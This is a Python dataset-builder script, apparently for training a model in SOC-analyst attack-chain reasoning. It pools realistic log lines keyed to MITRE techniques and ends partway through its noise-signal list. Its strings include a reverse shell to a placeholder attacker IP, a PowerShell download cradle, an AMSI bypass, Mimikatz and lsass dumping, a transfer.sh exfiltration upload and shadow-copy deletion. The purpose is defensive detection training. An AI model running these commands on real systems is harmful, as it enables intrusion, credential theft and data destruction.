#!/usr/bin/env python3
"""
Phase-2 v2 Dataset Builder — Apocalypse Training
=================================================
Generates multi-stage, realistic SOC-analyst-grade training samples.

Why v2?
  v1 data was single-technique classification with templated signals.
  The model learned "MITRE → MITRE" (memorization), not "real telemetry → chain reasoning".

v2 design principles:
  1. Signals are OBSERVABLE: Event IDs, log lines, commands, network telemetry — not MITRE descriptions
  2. Multi-step attack chains — model must reason across 4-8 tactics
  3. Competing technique hypotheses at each step — model must learn decision boundaries
  4. Explicit uncertainties — model must know what it cannot determine
  5. Partial observability — 50-80% of expected signals visible (simulates real SOC)
  6. Noise signals — benign-but-suspicious events mixed in
  7. Tool calls — model must recommend validation actions, not just declare a verdict
  8. Behavior-based detection (not SIGMA_Txxxx placeholders)
  9. Tiered mitigation: immediate / short-term / long-term

Usage:
  python3 scripts/data_collection/build_phase2_v2_dataset.py \\
      --train data/training/train.phase2.v2.jsonl \\
      --eval  data/evaluation/eval.phase2.v2.jsonl \\
      --n-train 350 \\
      --n-eval  60 \\
      --seed 42
"""

import argparse
import copy
import json
import random
import sys
from pathlib import Path


# ─────────────────────────────────────────────────────────────────────────────
# SIGNAL POOL  ·  technique_id → [realistic observable strings]
# Signals describe WHAT AN ANALYST SEES, not what the technique is called.
# ─────────────────────────────────────────────────────────────────────────────

SIGNAL_POOL: dict[str, list[str]] = {
    # ── Reconnaissance ────────────────────────────────────────────────────────
    "T1595.001": [
        "Masscan sweep from {src_ip} targeting ports 22,80,443,3389 across {target_subnet} — 5000 SYN packets in 90 seconds",
        "IDS: port scan signature matched from {src_ip} — sequential IP sweep across {target_subnet}",
        "Firewall: {n} connection attempts in 60 seconds from {src_ip} across sequential IPs with no established sessions",
        "Zeek conn.log: repeated SYN_SENT states without SYN-ACK from {src_ip} to multiple hosts",
    ],
    "T1595.002": [
        "Apache access.log: {src_ip} cycling through 150 User-Agent strings — /admin, /.htaccess, /backup.sql, /wp-login.php probed sequentially",
        "WAF alert: Nikto scan pattern from {src_ip} — rule 920350 (Host header injection) and 932100 (RCE attempt) matched",
        "SQLmap timing-based fingerprint in POST /login — response delays 8.2s vs normal 0.3s",
        "HTTP 404 flood: {src_ip} requesting /phpmyadmin/, /webdav/, /cgi-bin/env.cgi within 30 seconds",
    ],
    "T1592": [
        "DNS zone transfer attempt (AXFR) from {src_ip} against {target_domain} — returned REFUSED",
        "Passive DNS: 47 subdomain queries for *.{target_domain} from {src_ip} within 5 minutes",
        "Certificate transparency logs show fresh cert for vpn.{target_domain} issued 3 days before this activity",
        "LinkedIn scraping pattern against IT staff profiles — 400+ page views from datacenter IP block",
    ],
    # ── Initial Access ────────────────────────────────────────────────────────
    "T1190": [
        "Apache error.log: unhandled exception 'syntax error near unexpected token' propagated to HTTP 500 body — SQL fragment visible",
        "WAF rule 942100 (SQL Injection) matched on POST /login.php from {src_ip} — 200 OK returned despite match",
        "HTTP response time anomaly: /login endpoint returned in 8.3s (baseline 0.3s) — blind SQLi timing indicator",
        "Application log: 'Microsoft OLE DB Provider' error string in HTTP response body — database error leakage",
        "Suricata: ET WEB_SPECIFIC_APPS SQL Injection Attempt — UNION SELECT signature in request body",
    ],
    "T1566.001": [
        "Email gateway: macro-enabled .xlsm attachment (Invoice_Q1.xlsm) from external sender {src_ip} to finance team — 7 recipients",
        "Sandboxed attachment attempted DNS callback to out.{suspicious_domain} within 2 seconds of open",
        "Outlook spawning winword.exe → winword.exe spawning cmd.exe — Sysmon Event ID 1 chain",
        "AV alert on open: HEUR:Trojan.MSOffice.Macro.Agent in Invoice_Q1.xlsm",
        "User reported suspicious invoice — 'Enable Content' prompt appeared, macro ran on accept",
    ],
    "T1566.002": [
        "Email contains link to http://{phish_domain}/secure/update — TLS cert CN mismatch with displayed domain",
        "Proxy log: click-through from corporate Outlook client to http://{phish_domain}/secure/update",
        "Browser launched redirect chain: legitimate-site.com → 302 → {phish_domain} → payload host",
        "DNS: corporate client resolved {phish_domain} — domain registered 48 hours prior (newly seen domain)",
    ],
    "T1133": [
        "VPN auth log: {username} authenticated successfully from {src_ip} ({anomalous_geo}) — first time this geolocation",
        "Citrix Gateway: {username} active session from {anomalous_geo} while another session open from HQ IP — impossible travel",
        "Azure AD sign-in: legacy Basic auth used for {username} — MFA policy not enforced for legacy protocols",
        "VPN auth at 03:47 local time for {username} — outside normal working hours; device fingerprint not previously seen",
    ],
    # ── Execution ─────────────────────────────────────────────────────────────
    "T1059.001": [
        "Sysmon Event ID 1: {parent} spawning powershell.exe -nop -w hidden -enc {b64_payload}",
        "Event ID 4104 (PowerShell script block logging): IEX(New-Object Net.WebClient).DownloadString('{url}')",
        "AMSI bypass attempt logged: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "PowerShell history: Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' executed on {host}",
        "Sysmon: powershell.exe launching with -ExecutionPolicy Bypass -NonInteractive -NoProfile flags from %TEMP%",
    ],
    "T1059.003": [
        "Sysmon Event ID 1: cmd.exe /c whoami && net user && ipconfig /all — execution chain from IIS worker process (w3wp.exe)",
        "Process creation: cmd.exe launched from C:\\Windows\\Temp\\update.bat — not in change management system",
        "cmd.exe with environment variable expansion obfuscation: cmd /c set X=po^w^er^sh^ell && %X% -enc ...",
        "Web server (w3wp.exe) spawning cmd.exe — web shell execution pattern; GET /shell.aspx?cmd=whoami returned 200",
    ],
    "T1059.004": [
        "/bin/bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1 — reverse shell command detected in cron job on {host}",
        "Process: sh spawned by apache2 (httpd) — interactive TTY attached, /dev/pts/1 — web shell execution",
        "Auditd: execve('/bin/bash') by www-data UID 33 — unusual interactive session for service account",
        "Python3 one-liner in process list: python3 -c 'import socket,subprocess,os;s=socket.socket(...)' — reverse shell",
    ],
    "T1203": [
        "Browser crash followed by calc.exe / notepad.exe spawn — CVE exploit shellcode indicator",
        "Microsoft Office: Equation Editor (eqnedt32.exe) spawning powershell.exe — CVE-2017-11882 exploitation pattern",
        "Memory alert: shellcode in non-executable section of {parent} process — heap spray pattern",
    ],
    # ── Persistence ───────────────────────────────────────────────────────────
    "T1053.005": [
        "Event ID 4698: Scheduled task '\\Microsoft\\Windows\\Update\\CheckUpdateTask' created by {user} (non-admin) at 23:14",
        "schtasks /create /tn '\\Microsoft\\Windows\\Defender\\Cache' /tr 'C:\\Users\\Public\\update.exe' /sc DAILY /st 04:00 /ru SYSTEM",
        "Sysmon Event ID 11: file created C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Update\\CheckUpdateTask — content base64-encoded",
        "Task Scheduler: taskeng.exe spawning powershell.exe -enc {b64_payload} daily at 04:00 — no change ticket",
    ],
    "T1547.001": [
        "Sysmon Event ID 13: Registry value set — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater → %APPDATA%\\svchost32.exe",
        "Autoruns: new entry in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon — Userinit value modified",
        "Registry write to HKCU\\Environment\\UserInitMprLogonScript → C:\\Users\\Public\\logon.vbs by non-standard process",
        "Persistence: HKCU Run key pointing to %TEMP%\\{filename} — not in any software deployment record",
    ],
    "T1505.003": [
        "IIS log: POST to /aspnet_client/system_web/4_0_30319/update.aspx?cmd=whoami — 200 OK, 43 bytes",
        "New file created: /var/www/html/wp-content/uploads/2026/04/image.php — created by www-data at 02:31",
        "Sysmon Event ID 1: w3wp.exe spawning cmd.exe with 'net localgroup administrators' command — web shell RCE",
        "File modification: update.aspx timestamp 04/20 02:31 UTC — outside deployment window; MD5 not in baseline",
        "Web server spawning /bin/sh with pipe — interactive session via HTTP POST parameter 'cmd'",
    ],
    "T1136.001": [
        "Event ID 4720: Local account '{account}' created by non-admin process at 01:22 on {host}",
        "net user {account} Password123! /add && net localgroup administrators {account} /add — command sequence on {host}",
        "Event ID 4732: Account '{account}' added to Administrators group immediately after creation",
        "/etc/passwd modification detected — new entry for '{account}' with UID 0 (root equivalent)",
    ],
    # ── Privilege Escalation ──────────────────────────────────────────────────
    "T1055": [
        "Sysmon Event ID 8 (CreateRemoteThread): {source_process} creating thread in lsass.exe — process injection indicator",
        "EDR: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread sequence from {source_process} into explorer.exe",
        "Memory forensics: shellcode in non-executable region of svchost.exe (PID 1428) — RWX page created by injector",
        "Sysmon Event ID 8: Unexpected thread injection from {source_process} into winlogon.exe",
    ],
    "T1068": [
        "PrintSpoofer exploit: named pipe impersonation via SeImpersonatePrivilege — SYSTEM shell obtained from service account",
        "HiveNightmare (CVE-2021-36934): shadow copy of SAM/SYSTEM hive read by low-priv user",
        "Linux: SUID binary /usr/local/bin/custom_app exploited with ../../../etc/passwd path traversal — root shell",
        "JuicyPotato / RoguePotato: DCOM/NTLM relay token impersonation from IIS service account",
        "Windows kernel driver loaded from %TEMP% — unsigned driver installation attempted for privilege escalation",
    ],
    "T1548.002": [
        "fodhelper.exe spawning elevated cmd.exe — UAC bypass via HKCU\\Software\\Classes\\ms-settings registry hijack",
        "eventvwr.exe → mmc.exe → cmd.exe (elevated, integrity High) process chain — UAC bypass via event viewer",
        "Sysmon: sdclt.exe /KickOffElev followed by elevated shell without UAC prompt displayed",
        "Registry: HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to payload path 5 seconds before UAC bypass",
    ],
    "T1078.002": [
        "Event ID 4672: Special privileges (SeDebugPrivilege, SeTcbPrivilege) assigned to {admin_account} logon — workstation session unusual",
        "Domain admin account '{admin_account}' logged in interactively to workstation {host} — violates admin tier model",
        "Event ID 4728: {user} added to 'Domain Admins' group at 02:47 — outside change window, no ticket",
        "Service account escalated to Domain Admins — unauthorized group membership modification via ADUC",
    ],
    # ── Defense Evasion ───────────────────────────────────────────────────────
    "T1070.001": [
        "Event ID 1102: Security audit log cleared on {host} by {user} at 03:11 — 6-hour gap in event timeline",
        "wevtutil cl Security executed remotely via WinRM — Sysmon network connection + process creation correlation",
        "PowerShell: Clear-EventLog -LogName Security -ComputerName {host} — executed from attacker-controlled session",
        "Event log gap: 22:00–04:00 missing on DC01 — forced clearing or service disruption",
    ],
    "T1027": [
        "PowerShell script block logging: payload uses char-code substitution + string join — 3 layers of obfuscation",
        "PE file entropy score 7.94 (near-max 8.0) for {filename} — packed or encrypted binary",
        "XOR-encoded shellcode at runtime: meterpreter stub decoded in memory, not on disk",
        "Base64 → gzip → XOR chain in PowerShell IEX — evades static AMSI patterns",
    ],
    "T1562.001": [
        "Event ID 7036: Windows Defender service stopped on {host} — unexpected, not in maintenance window",
        "Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware = 1 — set by non-group-policy process",
        "PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true executed from elevated session on {host}",
        "EDR heartbeat lost on {host} for 47 minutes — agent process killed or service stopped",
        "AV exclusion added: C:\\Users\\Public\\ excluded from scanning via registry modification",
    ],
    # ── Credential Access ─────────────────────────────────────────────────────
    "T1110.003": [
        "Event ID 4625: {n} failed logon attempts from {src_ip} against domain accounts — different usernames, same password 'Summer2024!'",
        "SIEM correlation: failed logins across {n} accounts from {src_ip} — each account failed < 3 times (spraying pattern, avoids lockout)",
        "Azure AD Identity Protection: sign-in risk 'medium' — password spray pattern detected across {n} cloud accounts from single IP",
        "Auth log: sshd — Failed password for {username} from {src_ip} port 52341 — repeated across 20 usernames in 8 minutes",
        "Entra ID: MFA push fatigue attack — {n} push notifications to multiple users within 10 minutes from same auth session",
    ],
    "T1003.001": [
        "Sysmon Event ID 10: {source_process} opened lsass.exe (PID 676) with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
        "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp — command executed via PowerShell on {host}",
        "PowerShell script block: sekurlsa::logonpasswords — Mimikatz command decoded from base64 payload",
        "EDR: suspicious handle to lsass.exe from {source_process} — non-system, non-AV process",
        "WinPmem driver (winpmem_x64.sys) loaded — kernel memory acquisition tool for LSASS dump",
    ],
    "T1558.003": [
        "Event ID 4769: Kerberos service ticket (TGS) requested for SPN '{spn}' with RC4-HMAC cipher (0x17) — downgrade indicator",
        "Multiple Event ID 4769 from single account '{username}' requesting TGS for {n} service SPNs within 2 minutes",
        "GetUserSPNs.py trace in PowerShell history on {host} — Impacket Kerberoasting tool",
        "Unusual TGS-REP with etype 0x17 (RC4-HMAC) — service ticket for offline cracking",
    ],
    "T1555": [
        "LaZagne.exe executed on {host} — credential harvesting tool targeting browsers, mail clients, and vaults",
        "PowerShell: dpapi::chrome executed in Mimikatz session — browser saved credential decryption",
        "Unusual access to %APPDATA%\\Microsoft\\Credentials\\ by {source_process} — not browser or credential manager",
        "COM interface abuse: ICryptProtect called to decrypt DPAPI blobs outside normal application context",
    ],
    # ── Discovery ─────────────────────────────────────────────────────────────
    "T1082": [
        "PowerShell: Get-WmiObject Win32_ComputerSystem; Get-WmiObject Win32_OperatingSystem; Get-WmiObject Win32_BIOS — rapid enumeration on {host}",
        "Command sequence: whoami /all && systeminfo && hostname && net config workstation — executed post-compromise",
        "Auditd: execve uname -a; cat /etc/os-release; id; cat /etc/passwd — Linux host enumeration",
        "WMIC: wmic computersystem get; wmic os get; wmic diskdrive get — automated inventory from {host}",
    ],
    "T1018": [
        "Sysmon: arp -a && net view /domain && ping -n 1 sweep across 192.168.x.x — executed from {host}",
        "Nmap initiated from internal host {src_host}: nmap -sn {target_subnet} — internal host scanning internal subnet",
        "PowerShell: 1..254 | ForEach{Test-Connection -Count 1 192.168.1.$_ -ErrorAction SilentlyContinue} — subnet sweep",
        "LDAP query: all computer objects (objectClass=computer) from {host} (non-DC) — BloodHound/SharpHound pattern",
        "BloodHound collector detected: SharpHound.exe executed — AD relationship data collection for attack path planning",
    ],
    "T1087": [
        "net user /domain && net group 'Domain Admins' /domain && net group 'Enterprise Admins' /domain — executed from workstation",
        "LDAP query for all users with adminCount=1 from {host} — PowerView: Get-DomainUser -AdminCount",
        "Event ID 4661: SAM database handle requested by {source_process} — account enumeration from non-DC",
        "LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=512) — enabled user account enumeration",
    ],
    # ── Lateral Movement ──────────────────────────────────────────────────────
    "T1021.001": [
        "Event ID 4624 Type 10 (RemoteInteractive/RDP logon): {username} from {src_host} → {dst_host} at 02:33",
        "mstsc.exe launched on {src_host} with /v:{dst_host} argument — RDP initiated from endpoint, not jump server",
        "Firewall: unexpected 3389/TCP connection from {src_host} to {dst_host} — endpoint-to-server RDP",
        "RDP logon on {dst_host} at 03:00 from workstation {src_host} — outside business hours, non-admin account",
    ],
    "T1021.002": [
        "Event ID 5140: Network share \\\\{dst_host}\\ADMIN$ accessed from {src_host} by {username} — workstation-to-server Admin share",
        "Lateral movement tool: net use \\\\{dst_host}\\C$ /user:{username} followed by copy of payload",
        "Sysmon: PSEXESVC service created on {dst_host} from {src_host} — PsExec lateral execution pattern",
        "Event ID 5145: Detailed file share access to \\\\{dst_host}\\C$\\Windows\\Temp\\ by {username} — file staging for remote exec",
        "Pass-the-hash indicator: NTLM auth to \\\\{dst_host}\\ADMIN$ with no preceding Kerberos TGT request on {src_host}",
    ],
    "T1021.006": [
        "Event ID 4624 Type 3 on {dst_host} from {src_host} via WinRM service (port 5985) — non-admin workstation",
        "PowerShell remoting: Enter-PSSession -ComputerName {dst_host} from {src_host} — endpoint-to-endpoint remoting",
        "Invoke-Command: PowerShell remoting across {n} hosts — parallel execution pattern from single orchestrator",
        "WinRM connection {src_host} → {dst_host} → DC01 — hop chain via PSRemoting",
    ],
    "T1550.002": [
        "NTLM authentication to {dst_host} without prior Kerberos TGT on {src_host} — pass-the-hash pattern",
        "Mimikatz: sekurlsa::pth /user:{username} /domain:corp /ntlm:<hash> — PTH command in decoded script block",
        "Multiple NTLM lateral authentications from {src_host} with same NT hash value across {n} targets",
        "Event ID 4624 Type 3: NTLM logon on {dst_host} — no corresponding Type 2 (interactive) on source",
    ],
    # ── Collection ────────────────────────────────────────────────────────────
    "T1560": [
        "7z.exe a -p{password} C:\\Users\\Public\\data.7z C:\\Users\\{username}\\Documents\\ — archive with password from PowerShell",
        "rar.exe creating password-protected archive from finance share: rar a -hp{password} C:\\Temp\\docs.rar \\\\FS-01\\Finance\\",
        "PowerShell Compress-Archive: Compress-Archive -Path C:\\Sensitive -DestinationPath C:\\Temp\\backup.zip",
        "{n} .zip files created in C:\\Users\\Public\\ within 4 minutes — automated bulk archiving",
        "tar czf /tmp/exfil.tar.gz /home/user/data/ — Linux host data compression before exfiltration",
    ],
    "T1039": [
        "Event ID 5145: {username} bulk-reading {n} files from \\\\FS-01\\Finance\\ within 3 minutes — not normal for role",
        "SMB session: {username} opening 200+ files from \\\\FS-01\\HR\\ at 02:00 — off-hours bulk access",
        "DLP alert: sensitive label 'Confidential-IP' files accessed in bulk by {username} — volume exceeds 30-day baseline by 900%",
    ],
    "T1074": [
        "Multiple sensitive files (PDF, DOCX, XLSX) copied to C:\\Users\\Public\\ — world-readable staging directory",
        "Temp directory: 1.4 GB of documents, spreadsheets accumulated in %TEMP%\\~update\\ within 10 minutes",
        "Linux: 847 files copied to /tmp/stage/ by www-data — web shell spawned collection",
    ],
    # ── Command and Control ───────────────────────────────────────────────────
    "T1071.001": [
        "Netflow: {host} → {c2_ip}:443 — 60-second interval POST requests (8-12 bytes), sustained 6 hours — beaconing pattern",
        "JA3 fingerprint mismatch: TLS connection to {c2_ip} from {host} matches known Cobalt Strike JA3 hash (769,47-53-...)",
        "Proxy log: periodic HTTPS POST to {c2_ip}/jquery-3.3.1.min.js — URL masquerades as CDN request, fixed interval",
        "Zeek: small HTTP POST (avg 312 bytes) every 57 seconds to {c2_ip} — C2 check-in pattern",
    ],
    "T1071.004": [
        "DNS log: {n} queries/minute to {entropy_domain} from {host} — entropy score 4.8 (threshold 3.5) — DNS tunneling indicator",
        "Periodic DNS A queries for {entropy_domain} every 30 seconds — beaconing via DNS",
        "Long DNS TXT record response from {domain}: 255-character base64 blob — data exfiltration channel",
        "DNS query volume anomaly: {host} sent {n} queries to {domain} in 10 minutes — 40× normal baseline",
    ],
    "T1095": [
        "Raw TCP connection from {host} to {c2_ip}:{port} — no application-layer protocol recognized; custom framing",
        "ICMP echo-request payloads contain non-zero data section: 48-byte binary blob — covert channel indicator",
        "Custom binary protocol on port 8443 from {host} — TLS pattern not matching; custom handshake",
    ],
    "T1572": [
        "SSH tunnel from {host} to {c2_ip} (port 22): local port forwarding routing internal RDP traffic externally",
        "DNS-over-HTTPS to non-corporate resolver (1.1.1.1) bypassing corporate DNS proxy — covert resolution channel",
        "HTTP CONNECT tunnel through corporate proxy routing non-HTTP traffic to {c2_ip}:{port}",
    ],
    # ── Exfiltration ──────────────────────────────────────────────────────────
    "T1041": [
        "Netflow: {host} → {c2_ip}:443 — 287 MB upload over 22 minutes, 10× normal daily outbound baseline",
        "Proxy: sustained 50 Mbps upload from {host} to {c2_ip} coinciding with archive creation event 30 minutes prior",
        "HTTPS POST body size spike: 847 individual requests with 2-8 MB body each to {c2_ip} within 1 hour",
    ],
    "T1048": [
        "FTP session from {host} to {c2_ip}:21 — FTP not in approved protocol list; 340 MB transferred",
        "SFTP upload from {username} account to personal SSH server {c2_ip} — not corporate-managed destination",
        "Rclone.exe detected on {host}: rclone copy C:\\Temp\\data.7z {cloud_provider}:/ — cloud exfiltration tool",
    ],
    "T1567": [
        "curl -T /tmp/exfil.tar.gz https://transfer.sh/exfil — command-line cloud upload from {host}",
        "Rclone config: Mega.nz OAuth token found in %APPDATA%\\rclone\\rclone.conf — cloud sync configured",
        "Dropbox API call (api.dropboxapi.com) from {host} with 2 GB upload in 15 minutes — not corporate Dropbox tenant",
    ],
    # ── Impact ────────────────────────────────────────────────────────────────
    "T1486": [
        "vssadmin.exe delete shadows /all /quiet — shadow copy deletion executed prior to encryption on {host}",
        "Mass file extension rename: {n} files changed from .docx/.xlsx to .locked within 6 minutes",
        "RANSOM_NOTE.txt created in 847 directories across \\\\FS-01\\ — ransomware detonation",
        "Sysmon: cryptographic file write pattern — same process writing thousands of unique files in rapid succession",
    ],
    "T1490": [
        "bcdedit /set {default} recoveryenabled No executed on {n} hosts — boot recovery disabled",
        "wbadmin delete systemstatebackup — Windows backup deletion on DC01 before encryption",
        "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB — shrinking shadow storage to minimum",
        "WMI: Get-WmiObject Win32_ShadowCopy | Remove-WmiObject — PowerShell shadow copy deletion",
        "Windows Backup service (wbengine) stopped and set to Disabled via sc.exe on {n} servers",
    ],
    # Supply chain (special)
    "T1195.002": [
        "Signed software update from vendor '{vendor}' distributed via WSUS — binary hash mismatch vs vendor portal",
        "Trojanized DLL in software package: {filename} SHA256 does not match vendor-published hash",
        "SIEM: {n} endpoints simultaneously beaconing to {c2_ip} after 'SoftCorp Update Agent' installed",
        "Code signing certificate valid but binary behavior anomalous — sandbox detonation reveals C2 callback",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# COMPETING TECHNIQUES — what else could produce similar signals
# ─────────────────────────────────────────────────────────────────────────────

COMPETING: dict[str, list[dict]] = {
    "T1110.003": [
        {"name": "Credential Stuffing", "id": "T1110.004", "likelihood": "low",
         "rationale": "Stuffing uses known credential pairs from breach databases — spraying pattern uses common passwords across many accounts"},
        {"name": "Brute Force (single account)", "id": "T1110.001", "likelihood": "low",
         "rationale": "True brute force targets one account repeatedly — this pattern distributes attempts to avoid lockout"},
    ],
    "T1059.001": [
        {"name": "Windows Command Shell", "id": "T1059.003", "likelihood": "medium",
         "rationale": "Encoded command could be delegated to cmd.exe; parent process spawning pattern is similar"},
        {"name": "Visual Basic / Macro", "id": "T1059.005", "likelihood": "low",
         "rationale": "Office macro execution could produce similar Office-spawning-shell pattern before PS call"},
    ],
    "T1053.005": [
        {"name": "Boot/Logon Autostart (Registry Run)", "id": "T1547.001", "likelihood": "medium",
         "rationale": "Both achieve persistence at similar privilege level — registry run keys are equally common"},
        {"name": "Windows Service", "id": "T1543.003", "likelihood": "low",
         "rationale": "Service installation achieves SYSTEM persistence with similar administrative footprint"},
    ],
    "T1071.001": [
        {"name": "DNS Application Layer C2", "id": "T1071.004", "likelihood": "medium",
         "rationale": "High-entropy DNS queries co-occurring suggest dual-channel C2 or DNS as backup"},
        {"name": "Ingress Tool Transfer", "id": "T1105", "likelihood": "low",
         "rationale": "HTTPS traffic could be payload staging download rather than active C2 beacon"},
    ],
    "T1071.004": [
        {"name": "Web Protocols C2", "id": "T1071.001", "likelihood": "high",
         "rationale": "DNS tunneling typically paired with HTTPS C2; high-entropy DNS alone insufficient to confirm standalone"},
        {"name": "Non-Application Layer Protocol", "id": "T1095", "likelihood": "low",
         "rationale": "Custom protocol tunneled inside DNS queries — requires deep packet inspection to distinguish"},
    ],
    "T1021.002": [
        {"name": "Pass the Hash", "id": "T1550.002", "likelihood": "high",
         "rationale": "Admin share access without prior Kerberos TGT strongly suggests NTLM hash reuse"},
        {"name": "Remote Desktop Protocol", "id": "T1021.001", "likelihood": "medium",
         "rationale": "SMB lateral movement often precedes or follows interactive RDP session establishment"},
    ],
    "T1560": [
        {"name": "Data Staged", "id": "T1074", "likelihood": "high",
         "rationale": "Staging (file aggregation) typically precedes archiving; both may be observed simultaneously"},
        {"name": "Automated Collection", "id": "T1119", "likelihood": "medium",
         "rationale": "Scripted bulk archiving could indicate automated collection tool rather than manual operator action"},
    ],
    "T1041": [
        {"name": "Exfiltration Over Alternative Protocol", "id": "T1048", "likelihood": "medium",
         "rationale": "Upload could use FTP/SFTP/cloud storage rather than the active C2 channel"},
        {"name": "Exfiltration to Cloud Storage", "id": "T1567", "likelihood": "low",
         "rationale": "Cloud storage exfil mimics legitimate business backup traffic — harder to confirm without DLP"},
    ],
    "T1003.001": [
        {"name": "Credentials from Password Stores", "id": "T1555", "likelihood": "medium",
         "rationale": "Browser/vault credential access often attempted alongside LSASS dump for maximum coverage"},
        {"name": "Kerberoasting", "id": "T1558.003", "likelihood": "medium",
         "rationale": "Both achieve credential access; Kerberoasting leaves distinct 4769 RC4 ticket request pattern"},
    ],
    "T1190": [
        {"name": "Exploit Public-Facing App (Auth Bypass)", "id": "T1190", "likelihood": "high",
         "rationale": "SQLi vs auth bypass vs path traversal — exact sub-technique requires code and log review"},
        {"name": "Phishing Link", "id": "T1566.002", "likelihood": "low",
         "rationale": "Initial access could be user-initiated redirect to exploit kit rather than server-side exploitation"},
    ],
    "T1505.003": [
        {"name": "Server Software Component (Module)", "id": "T1505", "likelihood": "medium",
         "rationale": "Malicious IIS/Apache module injection achieves similar server-side execution without web shell file"},
        {"name": "Scheduled Task (via web vuln)", "id": "T1053.005", "likelihood": "low",
         "rationale": "Persistence could be scheduled task created via web vulnerability rather than interactive web shell"},
    ],
    "T1068": [
        {"name": "Access Token Manipulation", "id": "T1134", "likelihood": "medium",
         "rationale": "Token impersonation (e.g., via SeImpersonatePrivilege) achieves elevation without kernel exploit"},
        {"name": "Abuse Elevation Control Mechanism", "id": "T1548", "likelihood": "medium",
         "rationale": "UAC bypass achieves similar elevation footprint without exploiting a specific vulnerability"},
    ],
    "T1133": [
        {"name": "Valid Accounts (Compromised)", "id": "T1078", "likelihood": "high",
         "rationale": "Successful external auth could use stolen credentials rather than targeting the service itself"},
        {"name": "Phishing for Credentials", "id": "T1566", "likelihood": "medium",
         "rationale": "Credentials may have been phished separately; external remote service is the delivery vehicle"},
    ],
    "T1566.001": [
        {"name": "Spearphishing Link", "id": "T1566.002", "likelihood": "medium",
         "rationale": "Email could contain a link to hosted payload rather than an attachment"},
        {"name": "Drive-by Compromise", "id": "T1189", "likelihood": "low",
         "rationale": "User may have been redirected to exploit kit without deliberate phishing email"},
    ],
    "T1486": [
        {"name": "Inhibit System Recovery", "id": "T1490", "likelihood": "high",
         "rationale": "Ransomware almost always pairs encryption with shadow copy deletion — both likely present"},
        {"name": "Data Destruction", "id": "T1485", "likelihood": "medium",
         "rationale": "Wiper malware produces similar mass-write pattern — distinguish by ransom note presence"},
    ],
    "T1490": [
        {"name": "Data Encrypted for Impact", "id": "T1486", "likelihood": "high",
         "rationale": "Recovery inhibition precedes encryption — both typically present in ransomware operators"},
        {"name": "Service Stop", "id": "T1489", "likelihood": "medium",
         "rationale": "Disabling backup services may be prelude to service disruption rather than ransomware"},
    ],
    "T1195.002": [
        {"name": "Trusted Relationship Abuse", "id": "T1199", "likelihood": "medium",
         "rationale": "Managed service provider access could deliver malicious code with same trust level as supply chain"},
        {"name": "Compromise Software Dependencies", "id": "T1195.001", "likelihood": "medium",
         "rationale": "Open-source dependency poisoning produces similar initial footprint with different trust chain"},
    ],
    "T1547.001": [
        {"name": "Scheduled Task", "id": "T1053.005", "likelihood": "medium",
         "rationale": "Both achieve equivalent persistence; run key quicker to deploy but scheduled task more configurable"},
        {"name": "Winlogon Helper DLL", "id": "T1547.004", "likelihood": "low",
         "rationale": "Winlogon-based persistence achieves similar SYSTEM-level load without explicit run key"},
    ],
    "T1562.001": [
        {"name": "Indicator Removal", "id": "T1070", "likelihood": "medium",
         "rationale": "Disabling AV often paired with log clearing to cover both artifacts and telemetry"},
        {"name": "Masquerading", "id": "T1036", "likelihood": "low",
         "rationale": "Tool could masquerade as legitimate security tool process rather than explicitly killing AV"},
    ],
    "T1070.001": [
        {"name": "File Deletion", "id": "T1070.004", "likelihood": "medium",
         "rationale": "Attackers often delete individual artifact files alongside log clearing"},
        {"name": "Timestomp", "id": "T1070.006", "likelihood": "low",
         "rationale": "Timestamp manipulation achieves similar anti-forensic goal without destroying logs"},
    ],
    "T1548.002": [
        {"name": "Exploitation for Privilege Escalation", "id": "T1068", "likelihood": "medium",
         "rationale": "UAC bypass vs kernel exploit produce similar elevated shell — distinguish by process lineage"},
        {"name": "Access Token Manipulation", "id": "T1134", "likelihood": "low",
         "rationale": "Token impersonation can achieve similar high-integrity context without registry modification"},
    ],
    "T1078.002": [
        {"name": "DCSync Attack", "id": "T1003.006", "likelihood": "medium",
         "rationale": "Domain admin privilege could be used for DCSync to harvest all domain credentials"},
        {"name": "Golden Ticket", "id": "T1558.001", "likelihood": "low",
         "rationale": "With domain admin, attacker could forge Kerberos tickets rather than use compromised account directly"},
    ],
}

DEFAULT_COMPETING = [
    {"name": "Living-off-the-Land Binary (LOLBin)", "id": "T1218", "likelihood": "low",
     "rationale": "Built-in system tools can mimic many technique signatures — confirm via binary hash and behavior"},
    {"name": "Masquerading", "id": "T1036", "likelihood": "low",
     "rationale": "Legitimate-looking process name or path can mask true technique origin"},
]

# ─────────────────────────────────────────────────────────────────────────────
# NOISE SIGNALS — benign but suspicious-looking signals mixed into scenarios
# ─────────────────────────────────────────────────────────────────────────────

NOISE: dict[str, list[str]] = {
    "windows_ad": [
        "IT ops scheduled SCCM software inventory scan — elevated WMI query activity expected on endpoints this window",
        "Group policy refresh triggered wscript.exe execution on domain workstations — approved GPO update cycle",
        "Helpdesk ran password reset for {username} after lockout — {n} failed attempts legitimate (user forgot password)",
        "Legitimate remote admin session from jump server {jump_host} to {dst_host} — approved change request #45821",
        "File server backup job (Veeam) running 02:00–04:00 — elevated SMB read activity from backup service account is expected",
        "Windows Update (wuauclt.exe) downloading patches — expected outbound HTTPS to Microsoft CDN",
        "Certificate Services renewed PKI cert — expected LDAP queries to domain controller from CA server",
        "Antivirus definition update triggered McAfee service restart — momentary AV heartbeat loss expected",
    ],
    "linux": [
        "Cron job executed /usr/local/bin/cleanup.sh at 03:00 — standard maintenance script, approved",
        "APT package manager update by root — curl download activity from packages.debian.org is expected",
        "Nagios NRPE agent spawning shell commands for health checks — monitoring expected process",
